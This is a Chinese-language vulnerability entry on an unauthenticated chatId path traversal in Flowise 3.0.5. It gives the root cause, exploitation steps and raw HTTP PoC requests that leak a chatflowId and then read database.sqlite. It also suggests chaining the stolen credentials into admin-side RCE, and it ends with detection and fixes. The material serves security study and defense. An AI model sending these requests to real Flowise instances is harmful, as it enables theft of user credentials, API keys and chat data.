---
id: web-generic-file-inclusion-flowise-get-upload-file-chatid-traversal
title: Flowise 未授权任意文件读取：get-upload-file/openai-assistants-file 的 chatId 路径拼接穿越读取 database.sqlite
type: scenario
domain: web
path: web/generic/file-inclusion
technique: chat-id-path-join-traversal-storage-file-read
aliases:
- Flowise 任意文件读取
- Flowise chatId 路径穿越
- get-upload-file 未授权
- openai-assistants-file download
- database.sqlite 读取
tags:
- web
- flowise
- llm
- path-traversal
- arbitrary-file-read
- unauth
- sqlite
- storage
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: 3.0.5（原文复现版本，3.0.6 修复）
verification:
  verified_by: verifier-V227
  verified_at: '2026-11-07T06:55:26+08:00'
  notes: 已对照原文文件读取章节与 img19-29 核对：get-upload-file 与 openai-assistants-file/download 共用 streamStorageFile、path.join 拼接时提前归一化使后续 filePath.includes('..') 失效、chatId=/../.. 或 ../../ 到达 storage 根读取 database.sqlite、vector/upsert 用 ? 等文件名触发 500 回显 /root/.flowise/storage/<orgId>/<chatflowId>、两接口 200 返回 SQLite、openai-assistants 会破坏数据库的警告均与原文/截图一致。已修正表述：旧版本对 chatflowId 做 UUID 与 isPathTraversal 校验，但未对 chatId 做 isPathTraversal；3.0.6 增加 isPathTraversal(chatId)。受影响版本按原文标记 3.0.5（原文复现版本，3.0.6 修复），未猜更宽区间。未验证点：未复跑 PoC。
---

## 一句话结论

Flowise 的 `/api/v1/get-upload-file` 与 `/api/v1/openai-assistants-file/download` 把用户可控的 `chatId` 直接拼进 `path.join(storageRoot, orgId, chatflowId, chatId, fileName)`；由于 `path.join` 会先归一化 `..`，后续 `filePath.includes('..')` 检查失效，攻击者用 `chatId=/../..` 即可从 chatflow 目录穿越到 storage 根，读取 `database.sqlite`（含用户、凭据哈希、API Key、聊天与工作流数据），且读取接口在白名单内无需登录。

## 原理

- 处理器先校验 `chatflowId` 存在且为有效 UUID，然后调用 `streamStorageFile(chatflowId, chatId, fileName, orgid)`。
- `streamStorageFile` 用 `path.join(getStoragePath(), orgid, chatflowId, chatId, sanitizedFilename)` 生成文件路径。
- 关键缺陷：`path.join` 在拼接时就会规范化路径，`/../..` 被提前解析掉，返回的 `filePath` 中不再含字面量 `..`，因此 `if (filePath.includes('..')) throw` 无法发现穿越；同时归一化后的路径仍以 `getStoragePath()` 为前缀，`startsWith` 检查也通过。
- 旧版本对 chatflowId 做了 UUID 与 `isPathTraversal` 校验，但没有对 `chatId` 做 `isPathTraversal`，只要 chatflowId 对应记录存在，就能向上跳目录；跳两级后到达 storage 根，`fileName=database.sqlite` 命中默认数据库文件。
- 修复版本 3.0.6 在 `streamStorageFile` 中加入 `isPathTraversal(chatId)` 检查，`..`、`/`、`\` 及 URL 编码形式都会被拒绝。

## 触发条件

- 目标 Flowise 版本受影响（原文复现 3.0.5，3.0.6 修复）。
- 实例中至少存在一个 Chatflow（chatflowId 需要能查到对应记录）。
- 文件读取接口位于公开白名单，无需认证（原文复现请求未携带登录凭证）。
- 需要获得一个有效 chatflowId：可通过 `/api/v1/vector/upsert/` 上传特殊文件名触发报错，错误信息回显 `/root/.flowise/storage/<orgId>/<chatflowId>` 绝对路径，取最后一段即 chatflowId。

## 利用步骤

1. 获取 chatflowId：
   - 向 `POST /api/v1/vector/upsert/` 发送 multipart 请求，`filename` 设为 `?`、空格、`*`、`|`、`:`、`<`、`>` 等字符，使后端把路径当目录打开并报错；
   - 从 500 响应的 `message`/`stack` 中读取绝对路径，例如 `/root/.flowise/storage/3bb43ec6-.../918c78e2-...`，最后一段 `918c78e2-...` 即 chatflowId。
2. 读取数据库（推荐 `get-upload-file`，GET，无需登录）：
   `GET /api/v1/get-upload-file?chatflowId=<uuid>&chatId=../../&fileName=database.sqlite`
3. 响应体为 SQLite 文件内容（截图可见 `SQLite format 3` 与建表语句），可下载后本地打开，提取用户表、credential、API Key、chatflow 配置等。
4. 备选 `POST /api/v1/openai-assistants-file/download`，body 为 `{"chatflowId":"<uuid>","chatId":"/../..","fileName":"database.sqlite"}`；原文警告该接口会破坏数据库（导致数据库异常/只读化），不要在生产环境使用。

## PoC

chatflowId 泄露：

```http
POST /api/v1/vector/upsert/ HTTP/1.1
Host: <target>:3000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="files"; filename="?"
Content-Type: text/plain

------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

响应 500 的 `message` 内含 `/root/.flowise/storage/<orgId>/<chatflowId>`。

文件读取：

```http
GET /api/v1/get-upload-file?chatflowId=<chatflowId>&chatId=../../&fileName=database.sqlite HTTP/1.1
Host: <target>:3000
```

原文截图确认返回 200 与 `database.sqlite` 内容；`/api/v1/openai-assistants-file/download` 同样返回 200 与 SQLite 内容。

## 变体与关联

- 同一 `streamStorageFile` sink 被两个接口复用，修复需同时覆盖；fallback 分支 `path.join(getStoragePath(), chatflowId, chatId, filename)` 同样存在拼接面。
- `chatId=/../..` 只跳到 storage 根；继续增加 `../` 会触发 `startsWith(getStoragePath())` 拦截，实际可达范围以 storage 目录及数据库为主（原文点到 `database.sqlite`）。
- 与后台 RCE 组合：先未授权读取数据库获取用户凭据/API Key，再登录后台调用 CustomMCP 节点加载执行命令。

## 检测与防御

- 升级 Flowise >= 3.0.6；对 `chatflowId` 与 `chatId` 都做白名单格式校验（UUID/固定长度），并在拼接后检查规范化路径确实位于预期 chatflow 子目录内。
- 检测：访问日志中 `chatId` 含 `..`、`%2e%2e`、`%2f`、`%5c` 的请求；`get-upload-file` 返回 `database.sqlite` 或大体积二进制；`/api/v1/vector/upsert/` 上传非法文件名后 500 错误包含绝对路径。
- 加固：文件接口不要使用“先 `path.join` 归一化、再 `includes('..')` 检查”的写法，应在拼接前逐段校验，并用 `path.resolve` 后比较公共前缀；错误响应不要回显服务器绝对路径；数据库文件权限最小化。
